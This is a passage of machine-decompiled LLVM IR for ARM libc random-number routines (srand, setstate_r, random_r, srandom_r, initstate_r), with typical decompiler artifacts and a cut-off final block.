  %v0_12dd4 = load i32, i32* @r6, align 4
  %v0_12dd8 = load i32, i32* @r8, align 4
  store i32 %v0_12dd8, i32* @r0, align 4
  %v3_12ddc = load i32, i32* bitcast (i32** @global_var_22770.485 to i32*), align 4
  store i32 %v3_12ddc, i32* @r4, align 4
  %v4_12de0 = inttoptr i32 %v0_12dd8 to i32*
  %v5_12de0 = call i32 @__GI_initstate_r(i32* %v4_12de0, i32 %v0_12dd0, i32 %v0_12dd4, i32 ptrtoint (i32* @global_var_22768 to i32))
  store i32 %v2_12d94, i32* @r0, align 4
  %v1_12df4 = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_2276c.487 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_12e24 = load i32, i32* @r4, align 4
  %v9_12e24 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_22750.472 to i32), i32* @r4, align 4
  %v2_12e2c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_12e2c, i32* @r0, align 4
  %v1_12e48 = call i32 @__pthread_return_void()
  %v1_12e58 = call i32 @__pthread_return_0()
  %v0_12e5c = load i32, i32* @r6, align 4
  store i32 %v0_12e5c, i32* @r0, align 4
  %v2_12e64 = inttoptr i32 %v0_12e5c to i32*
  %v3_12e64 = call i32 @srandom_r(i32* %v2_12e64, i32 ptrtoint (i32* @global_var_22768 to i32))
  store i32 %v2_12e2c, i32* @r0, align 4
  store i32 77440, i32* @lr, align 4
  %v1_12e7c = call i32 @__pthread_return_void()
  store i32 %v3_12e24, i32* @r4, align 4
  store i32 %v9_12e24, i32* @r6, align 4
  ret i32 %v1_12e7c

; uselistorder directives
  uselistorder i32* @global_var_22768, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_22768 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_12ea0 = add i32 %tmp, 12
  %v2_12ea0 = inttoptr i32 %v1_12ea0 to i32*
  %v3_12ea0 = load i32, i32* %v2_12ea0, align 4
  %v3_12ea4 = load i32, i32* @r4, align 4
  store i32 %v3_12ea4, i32* %stack_var_-20, align 4
  %v2_12ea8 = icmp eq i32 %v3_12ea0, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_12ea8, label %.thread7, label %.thread8

.thread7:                                         ; preds = %entry
  %v1_12eb41 = add i32 %tmp, 8
  %v2_12eb42 = inttoptr i32 %v1_12eb41 to i32*
  %v3_12eb43 = load i32, i32* %v2_12eb42, align 4
  store i32 %v3_12eb43, i32* %r1.global-to-local, align 4
  %v3_12ec8 = add i32 %v3_12eb43, -4
  %v4_12ec8 = inttoptr i32 %v3_12ec8 to i32*
  store i32 0, i32* %v4_12ec8, align 4
  br label %bb

.thread8:                                         ; preds = %entry
  %v2_12eb0 = add i32 %tmp, 4
  %v3_12eb0 = inttoptr i32 %v2_12eb0 to i32*
  %v4_12eb0 = load i32, i32* %v3_12eb0, align 4
  %v1_12eb4 = add i32 %tmp, 8
  %v2_12eb4 = inttoptr i32 %v1_12eb4 to i32*
  %v3_12eb4 = load i32, i32* %v2_12eb4, align 4
  store i32 %v3_12eb4, i32* %r1.global-to-local, align 4
  %v3_12eb8 = sub i32 %v4_12eb0, %v3_12eb4
  %v4_12ebc = sdiv i32 %v3_12eb8, 4
  %v4_12ec4 = mul i32 %v4_12ebc, 5
  %v5_12ec4 = add i32 %v4_12ec4, %v3_12ea0
  %v3_12ecc = add i32 %v3_12eb4, -4
  %v4_12ecc = inttoptr i32 %v3_12ecc to i32*
  store i32 %v5_12ec4, i32* %v4_12ecc, align 4
  br label %bb

bb:                                               ; preds = %.thread7, %.thread8
  %v1_12ed0 = add i32 %arg1, 4
  store i32 %v1_12ed0, i32* %r6.global-to-local, align 4
  %v2_12ed4 = inttoptr i32 %arg1 to i32*
  %v3_12ed4 = load i32, i32* %v2_12ed4, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_12edc = srem i32 %v3_12ed4, 5
  store i32 %v2_12edc, i32* %r0.global-to-local, align 4
  %v2_12ee8 = and i32 %v2_12edc, 1073741824
  %v3_12ee8 = icmp ne i32 %v2_12ee8, 0
  %v4_12ee8 = mul nsw i32 %v2_12edc, 4
  %v2_12eec = icmp ne i32 %v2_12edc, 4
  %v3_12eec = and i1 %v3_12ee8, %v2_12eec
  br i1 %v3_12eec, label %dec_label_pc_12f48, label %dec_label_pc_12ef0

dec_label_pc_12ef0:                               ; preds = %bb
  %v5_12ee8 = add i32 %v4_12ee8, ptrtoint (i32* @global_var_19f08.501 to i32)
  %v1_12ef0 = add i32 %v4_12ee8, add (i32 ptrtoint (i32* @global_var_19f08.501 to i32), i32 20)
  %v2_12ef0 = inttoptr i32 %v1_12ef0 to i32*
  %v3_12ef0 = load i32, i32* %v2_12ef0, align 4
  store i32 %v3_12ef0, i32* %r5.global-to-local, align 4
  %v6_12ef4 = inttoptr i32 %v5_12ee8 to i32*
  %v7_12ef4 = load i32, i32* %v6_12ef4, align 4
  store i32 %v7_12ef4, i32* %r7.global-to-local, align 4
  %v2_12ef8 = icmp eq i32 %v2_12edc, 0
  store i32 5, i32* %r1.global-to-local, align 4
  %v1_12f00 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f00 = add i32 %v1_12f00, 16
  %v3_12f00 = inttoptr i32 %v2_12f00 to i32*
  store i32 %v3_12ef0, i32* %v3_12f00, align 4
  %v0_12f04 = load i32, i32* %r7.global-to-local, align 4
  %v1_12f04 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f04 = add i32 %v1_12f04, 20
  %v3_12f04 = inttoptr i32 %v2_12f04 to i32*
  store i32 %v0_12f04, i32* %v3_12f04, align 4
  %v0_12f08 = load i32, i32* %r0.global-to-local, align 4
  %v1_12f08 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f08 = add i32 %v1_12f08, 12
  %v3_12f08 = inttoptr i32 %v2_12f08 to i32*
  store i32 %v0_12f08, i32* %v3_12f08, align 4
  br i1 %v2_12ef8, label %dec_label_pc_12f34, label %dec_label_pc_12f10

dec_label_pc_12f10:                               ; preds = %dec_label_pc_12ef0
  %v0_12f10 = load i32, i32* %r6.global-to-local, align 4
  %v1_12f10 = add i32 %v0_12f10, -4
  %v2_12f10 = inttoptr i32 %v1_12f10 to i32*
  %v3_12f10 = load i32, i32* %v2_12f10, align 4
  %v1_12f14 = load i32, i32* %r1.global-to-local, align 4
  %v2_12f14 = sdiv i32 %v3_12f10, %v1_12f14
  store i32 %v2_12f14, i32* %r0.global-to-local, align 4
  %v4_12f18 = mul i32 %v2_12f14, 4
  %v5_12f18 = add i32 %v4_12f18, %v0_12f10
  %v1_12f1c = load i32, i32* %r4.global-to-local, align 4
  %v2_12f1c = add i32 %v1_12f1c, 4
  %v3_12f1c = inttoptr i32 %v2_12f1c to i32*
  store i32 %v5_12f18, i32* %v3_12f1c, align 4
  %v0_12f20 = load i32, i32* %r0.global-to-local, align 4
  %v1_12f20 = load i32, i32* %r7.global-to-local, align 4
  %v2_12f20 = add i32 %v1_12f20, %v0_12f20
  %v0_12f24 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12f24, i32* %r1.global-to-local, align 4
  %v2_12f28 = srem i32 %v2_12f20, %v0_12f24
  %v0_12f2c = load i32, i32* %r6.global-to-local, align 4
  %v4_12f2c = mul i32 %v2_12f28, 4
  %v5_12f2c = add i32 %v0_12f2c, %v4_12f2c
  store i32 %v5_12f2c, i32* %r0.global-to-local, align 4
  %v1_12f30 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f30 = inttoptr i32 %v1_12f30 to i32*
  store i32 %v5_12f2c, i32* %v2_12f30, align 4
  br label %dec_label_pc_12f34

dec_label_pc_12f34:                               ; preds = %dec_label_pc_12ef0, %dec_label_pc_12f10
  %v0_12f34 = load i32, i32* %r6.global-to-local, align 4
  %v1_12f34 = load i32, i32* %r5.global-to-local, align 4
  %v4_12f34 = mul i32 %v1_12f34, 4
  %v5_12f34 = add i32 %v4_12f34, %v0_12f34
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12f3c = load i32, i32* %r4.global-to-local, align 4
  %v2_12f3c = add i32 %v1_12f3c, 24
  %v3_12f3c = inttoptr i32 %v2_12f3c to i32*
  store i32 %v5_12f34, i32* %v3_12f3c, align 4
  %v0_12f40 = load i32, i32* %r6.global-to-local, align 4
  %v1_12f40 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f40 = add i32 %v1_12f40, 8
  %v3_12f40 = inttoptr i32 %v2_12f40 to i32*
  store i32 %v0_12f40, i32* %v3_12f40, align 4
  %v2_12f44 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12f44, i32* %r4.global-to-local, align 4
  ret i32 0

dec_label_pc_12f48:                               ; preds = %bb
  %v0_12f48 = call i32 @__errno_location()
  %v2_12f50 = inttoptr i32 %v0_12f48 to i32*
  store i32 22, i32* %v2_12f50, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12f58 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12f58, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_12edc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %tmp, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 3, 4, 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f34, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_12f60 = add i32 %tmp, 12
  %v2_12f60 = inttoptr i32 %v1_12f60 to i32*
  %v3_12f60 = load i32, i32* %v2_12f60, align 4
  store i32 %v3_12f60, i32* %r3.global-to-local, align 4
  %v2_12f64 = icmp eq i32 %v3_12f60, 0
  %v3_12f68 = load i32, i32* @r4, align 4
  store i32 %v3_12f68, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_12f74 = add i32 %tmp, 8
  %v2_12f74 = inttoptr i32 %v1_12f74 to i32*
  %v3_12f74 = load i32, i32* %v2_12f74, align 4
  store i32 %v3_12f74, i32* %lr.global-to-local, align 4
  br i1 %v2_12f64, label %dec_label_pc_12f7c, label %dec_label_pc_12fa0

dec_label_pc_12f7c:                               ; preds = %entry
  %v1_12f7c = inttoptr i32 %v3_12f74 to i32*
  %v2_12f7c = load i32, i32* %v1_12f7c, align 4
  store i32 %v2_12f7c, i32* %r2.global-to-local, align 4
  %v2_12f84 = mul i32 %v2_12f7c, 1103515245
  %v1_12f8c = add i32 %v2_12f84, 12345
  %tmp10 = bitcast i32 %v1_12f8c to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_12f90 = bitcast float %tmp11 to i32
  store i32 %v1_12f90, i32* %r3.global-to-local, align 4
  store i32 %v1_12f90, i32* %v1_12f7c, align 4
  %v0_12f98 = load i32, i32* %r3.global-to-local, align 4
  %v2_12f98 = inttoptr i32 %arg2 to i32*
  store i32 %v0_12f98, i32* %v2_12f98, align 4
  br label %dec_label_pc_12fe4

dec_label_pc_12fa0:                               ; preds = %entry
  %v2_12fa0 = load i32, i32* %arg1, align 4
  store i32 %v2_12fa0, i32* %r2.global-to-local, align 4
  %v1_12fa4 = add i32 %tmp, 4
  %v2_12fa4 = inttoptr i32 %v1_12fa4 to i32*
  %v3_12fa4 = load i32, i32* %v2_12fa4, align 4
  store i32 %v3_12fa4, i32* %r0.global-to-local, align 4
  %v1_12fa8 = inttoptr i32 %v2_12fa0 to i32*
  %v2_12fa8 = load i32, i32* %v1_12fa8, align 4
  store i32 %v2_12fa8, i32* %r3.global-to-local, align 4
  %v1_12fac = inttoptr i32 %v3_12fa4 to i32*
  %v2_12fac = load i32, i32* %v1_12fac, align 4
  %v4_12fac = add i32 %v3_12fa4, 4
  store i32 %v4_12fac, i32* %r0.global-to-local, align 4
  %v2_12fb0 = add i32 %v2_12fac, %v2_12fa8
  store i32 %v2_12fb0, i32* %r3.global-to-local, align 4
  store i32 %v2_12fb0, i32* %v1_12fa8, align 4
  %v3_12fb4 = load i32, i32* %r2.global-to-local, align 4
  %v4_12fb4 = add i32 %v3_12fb4, 4
  store i32 %v4_12fb4, i32* %r2.global-to-local, align 4
  %v0_12fb8 = load i32, i32* %ip.global-to-local, align 4
  %v1_12fb8 = add i32 %v0_12fb8, 24
  %v2_12fb8 = inttoptr i32 %v1_12fb8 to i32*
  %v3_12fb8 = load i32, i32* %v2_12fb8, align 4
  store i32 %v3_12fb8, i32* %r4.global-to-local, align 4
  %v0_12fbc = load i32, i32* %r3.global-to-local, align 4
  %v3_12fbc = udiv i32 %v0_12fbc, 2
  store i32 %v3_12fbc, i32* %r3.global-to-local, align 4
  %v3_12fc0 = icmp ult i32 %v4_12fb4, %v3_12fb8
  %v1_12fc4 = load i32, i32* %r5.global-to-local, align 4
  %v2_12fc4 = inttoptr i32 %v1_12fc4 to i32*
  store i32 %v3_12fbc, i32* %v2_12fc4, align 4
  br i1 %v3_12fc0, label %dec_label_pc_12fd4, label %bb

bb:                                               ; preds = %dec_label_pc_12fa0
  %v1_12fc8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_12fc8, i32* %r2.global-to-local, align 4
  %v0_12fcc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12fcc, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_12fd4:                               ; preds = %dec_label_pc_12fa0
  %v0_12fcc1 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12fcc1, i32* %r3.global-to-local, align 4
  %v1_12fd4 = load i32, i32* %r4.global-to-local, align 4
  %v3_12fd4 = icmp ult i32 %v0_12fcc1, %v1_12fd4
  br i1 %v3_12fd4, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_12fd4
  store i32 %v0_12fcc1, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_12fd4
  %v1_12fdc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_12fdc, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_12fe0 = load i32, i32* %ip.global-to-local, align 4
  %v1_12fe0 = inttoptr i32 %v0_12fe0 to i32*
  %v2_12fe0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_12fe0, i32* %v1_12fe0, align 4
  %v3_12fe0 = add i32 %v0_12fe0, 4
  %v4_12fe0 = inttoptr i32 %v3_12fe0 to i32*
  %v5_12fe0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_12fe0, i32* %v4_12fe0, align 4
  br label %dec_label_pc_12fe4

dec_label_pc_12fe4:                               ; preds = %dec_label_pc_12f7c, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_12fe8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12fe8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_12fcc1, { 1, 0, 2 }
  uselistorder i32 %v3_12fbc, { 1, 0 }
  uselistorder i32 %v1_12f90, { 1, 0 }
  uselistorder i32 %tmp, { 1, 3, 2, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder label %dec_label_pc_12fe4, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12ff0 = load i32, i32* @r4, align 4
  store i32 %v3_12ff0, i32* %stack_var_-32, align 4
  %v6_12ff0 = load i32, i32* @r5, align 4
  %v1_12ff4 = add i32 %tmp, 12
  %v2_12ff4 = inttoptr i32 %v1_12ff4 to i32*
  %v3_12ff4 = load i32, i32* %v2_12ff4, align 4
  %v2_12ffc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp29 = icmp ugt i32 %v3_12ff4, 4
  br i1 %tmp29, label %.dec_label_pc_130a8_crit_edge, label %dec_label_pc_1300c

.dec_label_pc_130a8_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_130a8

dec_label_pc_1300c:                               ; preds = %entry
  %v0_1300c = load i32, i32* @r0, align 4
  %v2_1300c = icmp eq i32 %v0_1300c, 0
  %v1_13010 = add i32 %tmp, 8
  %v2_13010 = inttoptr i32 %v1_13010 to i32*
  %v3_13010 = load i32, i32* %v2_13010, align 4
  store i32 %v3_13010, i32* %r7.global-to-local, align 4
  br i1 %v2_1300c, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_1300c
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_1300c, %bb
  %v0_1301c = phi i32 [ %v0_1300c, %dec_label_pc_1300c ], [ 1, %bb ]
  %v2_13018 = icmp eq i32 %v3_12ff4, 0
  %v2_1301c = inttoptr i32 %v3_13010 to i32*
  store i32 %v0_1301c, i32* %v2_1301c, align 4
  br i1 %v2_13018, label %dec_label_pc_130a4, label %dec_label_pc_13024

dec_label_pc_13024:                               ; preds = %bb21
  %v1_13024 = add i32 %tmp, 16
  %v2_13024 = inttoptr i32 %v1_13024 to i32*
  %v3_13024 = load i32, i32* %v2_13024, align 4
  store i32 %v3_13024, i32* %sb.global-to-local, align 4
  %v0_13028 = load i32, i32* @r0, align 4
  %v0_1302c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1302c, i32* %sl.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  %v5_1307423 = icmp sgt i32 %v3_13024, 1
  br i1 %v5_1307423, label %dec_label_pc_13038, label %dec_label_pc_13078

dec_label_pc_13038:                               ; preds = %dec_label_pc_13024, %dec_label_pc_13038
  %v0_1304825 = phi i32 [ %v0_13068.pre, %dec_label_pc_13038 ], [ %v0_13028, %dec_label_pc_13024 ]
  %v1_1306024 = phi i32 [ %v5_13060, %dec_label_pc_13038 ], [ %v0_1302c, %dec_label_pc_13024 ]
  %v2_13038 = srem i32 %v0_1304825, 127773
  %v2_13044 = mul i32 %v2_13038, 16807
  %v2_1304c = sdiv i32 %v0_1304825, 127773
  %tmp30 = mul nsw i32 %v2_1304c, -2836
  %v2_13058 = add i32 %v2_13044, %tmp30
  %v8_13058 = icmp slt i32 %v2_13058, 0
  %v2_1305c = add i32 %v2_13058, 2147483647
  %v2_1305c.v2_13058 = select i1 %v8_13058, i32 %v2_1305c, i32 %v2_13058
  store i32 %v2_1305c.v2_13058, i32* @r5, align 4
  %v2_13060 = add i32 %v1_1306024, 4
  %v3_13060 = inttoptr i32 %v2_13060 to i32*
  store i32 %v2_1305c.v2_13058, i32* %v3_13060, align 4
  %v4_13060 = load i32, i32* %sl.global-to-local, align 4
  %v5_13060 = add i32 %v4_13060, 4
  store i32 %v5_13060, i32* %sl.global-to-local, align 4
  %v0_13064.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_13064.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_13068.pre = load i32, i32* @r5, align 4
  %v1_13070 = add i32 %v0_13064.pre, 1
  store i32 %v1_13070, i32* %r8.global-to-local, align 4
  %v5_13074 = icmp slt i32 %v0_13064.pre, %v1_13064.pre
  br i1 %v5_13074, label %dec_label_pc_13038, label %dec_label_pc_13064.dec_label_pc_13078_crit_edge

dec_label_pc_13064.dec_label_pc_13078_crit_edge:  ; preds = %dec_label_pc_13038
  %v0_13084.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13078

dec_label_pc_13078:                               ; preds = %dec_label_pc_13064.dec_label_pc_13078_crit_edge, %dec_label_pc_13024
  %v0_13084 = phi i32 [ %v0_13084.pre, %dec_label_pc_13064.dec_label_pc_13078_crit_edge ], [ %v0_1302c, %dec_label_pc_13024 ]
  %v0_1307c.lcssa = phi i32 [ %v1_13064.pre, %dec_label_pc_13064.dec_label_pc_13078_crit_edge ], [ %v3_13024, %dec_label_pc_13024 ]
  %v2_1307c = mul i32 %v0_1307c.lcssa, 10
  store i32 %v2_1307c, i32* @r4, align 4
  %v0_13080 = load i32, i32* %r6.global-to-local, align 4
  %v1_13080 = add i32 %v0_13080, 20
  %v2_13080 = inttoptr i32 %v1_13080 to i32*
  %v3_13080 = load i32, i32* %v2_13080, align 4
  %v4_13084 = mul i32 %v3_13080, 4
  %v5_13084 = add i32 %v0_13084, %v4_13084
  %v1_13088 = inttoptr i32 %v0_13080 to i32*
  store i32 %v5_13084, i32* %v1_13088, align 4
  %v3_13088 = add i32 %v0_13080, 4
  %v4_13088 = inttoptr i32 %v3_13088 to i32*
  %v5_13088 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_13088, i32* %v4_13088, align 4
  br label %dec_label_pc_13094

dec_label_pc_13090:                               ; preds = %dec_label_pc_13094
  %v0_13098 = load i32, i32* %r6.global-to-local, align 4
  %v2_13090 = inttoptr i32 %v0_13098 to i32*
  %v3_13090 = call i32 @__GI_random_r(i32* %v2_13090, i32 %v2_12ffc)
  br label %dec_label_pc_13094

dec_label_pc_13094:                               ; preds = %dec_label_pc_13078, %dec_label_pc_13090
  %v0_13094 = load i32, i32* @r4, align 4
  %v1_13094 = add i32 %v0_13094, -1
  store i32 %v1_13094, i32* @r4, align 4
  %v6_13094 = icmp slt i32 %v1_13094, 0
  br i1 %v6_13094, label %dec_label_pc_130a4, label %dec_label_pc_13090

dec_label_pc_130a4:                               ; preds = %dec_label_pc_13094, %bb21
  %v2_130ac.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_130a8

dec_label_pc_130a8:                               ; preds = %.dec_label_pc_130a8_crit_edge, %dec_label_pc_130a4
  %v2_130ac = phi i32 [ %v3_12ff0, %.dec_label_pc_130a8_crit_edge ], [ %v2_130ac.pre, %dec_label_pc_130a4 ]
  %v26_130ac = phi i32 [ -1, %.dec_label_pc_130a8_crit_edge ], [ 0, %dec_label_pc_130a4 ]
  store i32 %v2_130ac, i32* @r4, align 4
  store i32 %v6_12ff0, i32* @r5, align 4
  ret i32 %v26_130ac

; uselistorder directives
  uselistorder i32 %v1_13094, { 1, 0 }
  uselistorder i32 %v0_13080, { 1, 0, 2 }
  uselistorder i32 %v0_13064.pre, { 1, 0 }
  uselistorder i32 %v5_13060, { 1, 0 }
  uselistorder i32 %v2_13058, { 2, 1, 0 }
  uselistorder i32 %v0_1304825, { 1, 0 }
  uselistorder i32 %v0_1302c, { 1, 0, 2 }
  uselistorder i32 %v3_13024, { 1, 0, 2 }
  uselistorder i32 %v3_12ff4, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_130a8, { 1, 0 }
  uselistorder label %dec_label_pc_13094, { 1, 0 }
  uselistorder label %dec_label_pc_13038, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_130b0:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_130b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_130b0, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_130b0
  %v2_130b0 = load i32, i32* @r7, align 4
  %v5_130b0 = udiv i32 %v2_130b0, 8
  %v6_130b0 = and i32 %v5_130b0, %arg1
  store i32 %v6_130b0, i32* %r4.global-to-local, align 4
  %v2_130b4 = load i32, i32* @sp, align 4
  %v8_130b4 = shl i32 %v2_130b4, %arg3
  %v9_130b4 = and i32 %v8_130b4, %arg2
  call void @__pseudo_branch(i32 %v9_130b4)
  %v0_130b8.pr.pr = load i1, i1* @cpsr_z, align 1
  %v1_130b8 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_130b8.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v2_130b8 = load i32, i32* %r4.global-to-local, align 4
  %v3_130b8 = load i32, i32* @fp, align 4
  %v8_130b8 = shl i32 %v2_130b8, %v3_130b8
  %v9_130b8 = and i32 %v8_130b8, %v1_130b8
  store i32 %v9_130b8, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread, %dec_label_pc_130b0, %bb
  %v10_130b8 = phi i32 [ %arg1, %dec_label_pc_130b0 ], [ %v9_130b8, %bb ], [ %v1_130b8, %.thread ]
  ret i32 %v10_130b8

; uselistorder directives
  uselistorder i32 %v1_130b8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 2, 0, 1 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_130c0 = load i32, i32* @r4, align 4
  store i32 %v3_130c0, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_130e0, label %dec_label_pc_130d0

dec_label_pc_130d0:                               ; preds = %entry
  %v2_130d0 = icmp ugt i32 %arg2, 254
  %v7_130d0 = icmp eq i32 %arg2, 255
  %v2_130d4 = xor i1 %v7_130d0, true
  %v3_130d4 = and i1 %v2_130d0, %v2_130d4
  br i1 %v3_130d4, label %bb, label %bb20

bb:                                               ; preds = %dec_label_pc_130d0
  store i32 4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_130d0, %bb
  %v1_131087 = phi i32 [ %v3_130c0, %dec_label_pc_130d0 ], [ 4, %bb ]
  %v2_130d8 = xor i1 %v2_130d0, true
  %v3_130d8 = or i1 %v7_130d0, %v2_130d8
  br i1 %v3_130d8, label %bb21, label %bb25

bb21:                                             ; preds = %bb20
  store i32 3, i32* @r4, align 4
  br label %bb25

dec_label_pc_130e0:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_130f8, label %dec_label_pc_130e8

dec_label_pc_130e8:                               ; preds = %dec_label_pc_130e0
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_13164

.thread10:                                        ; preds = %dec_label_pc_130e8
  store i32 0, i32* @r4, align 4
  br label %bb25

dec_label_pc_130f8:                               ; preds = %dec_label_pc_130e0
  %v2_130f8 = icmp ugt i32 %arg2, 62
  %v7_130f8 = icmp eq i32 %arg2, 63
  %v2_130fc = xor i1 %v7_130f8, true
  %v3_130fc = and i1 %v2_130f8, %v2_130fc
  br i1 %v3_130fc, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_130f8
  store i32 2, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_130f8, %bb22
  %v1_131086 = phi i32 [ %v3_130c0, %dec_label_pc_130f8 ], [ 2, %bb22 ]
  %v2_13100 = xor i1 %v2_130f8, true
  %v3_13100 = or i1 %v7_130f8, %v2_13100
  br i1 %v3_13100, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  store i32 1, i32* @r4, align 4
  br label %bb25

bb25:                                             ; preds = %.thread10, %bb21, %bb20, %bb23, %bb24
